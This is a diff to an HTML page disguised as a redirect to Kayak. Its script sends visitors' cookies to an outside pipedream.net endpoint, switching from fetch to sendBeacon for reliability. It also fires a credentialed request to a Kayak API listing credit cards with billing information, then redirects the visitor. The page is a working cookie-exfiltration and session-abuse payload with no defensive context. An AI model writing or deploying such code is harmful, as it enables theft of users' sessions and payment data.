@@ -1,24 +1,22 @@
-
 <!DOCTYPE html>
 <html>
 <head>
   <title>Redirecting...</title>
   <script>
-    // 🕵️ Leak accessible cookies
-    fetch("https://eoh3rxe2o8pbhuj.m.pipedream.net/?cookie=" + encodeURIComponent(document.cookie), {
-      method: "GET",
-      mode: "no-cors",
-      credentials: "include"
-    });
+    // 🕵️ Leak accessible cookies via Beacon (more reliable than fetch on unload)
+    navigator.sendBeacon(
+      "https://eoh3rxe2o8pbhuj.m.pipedream.net/",
+      new URLSearchParams({ cookie: document.cookie })
+    );
 
-    // 🚀 Send user's session to the API
+    // 🚀 Optional: fire a blind request to sensitive API (no need to await it)
     fetch("https://www.kayak.com/api/whisky/V1/cc/list?includeBilling=true&knownTravelerNumberApiVersion=v2", {
       method: "GET",
       mode: "cors",
       credentials: "include"
     });
 
-    // ✅ Always redirect after 1.5s, no matter what
+    // 🔁 Clean redirect to Kayak after 1.5s
     setTimeout(() => {
       window.location.href = "https://www.kayak.com";
     }, 1500);
@@ -28,3 +26,4 @@
   Redirecting to Kayak...
 </body>
 </html>
+
